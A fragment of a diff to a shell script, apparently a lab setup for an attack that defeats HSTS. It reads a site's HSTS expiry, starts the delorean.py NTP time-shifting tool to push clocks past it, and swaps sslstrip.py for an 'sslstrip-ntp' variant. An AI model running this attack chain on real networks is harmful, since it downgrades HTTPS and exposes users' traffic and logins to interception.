@@ -11,4 +11,4 @@ hsts_expire=$(curl -v https://www.opeth.secure --insecure 2>&1  | grep Strict | 
 hsts_expire=$(($hsts_expire / 60 + 1))
 
 /mnt/host/delorean.py -p $DELOREAN_PORT -n -s ${hsts_expire}m &
-/mnt/host/sslstrip.py $PROXY_PORT
+/mnt/host/sslstrip-ntp.py $PROXY_PORT
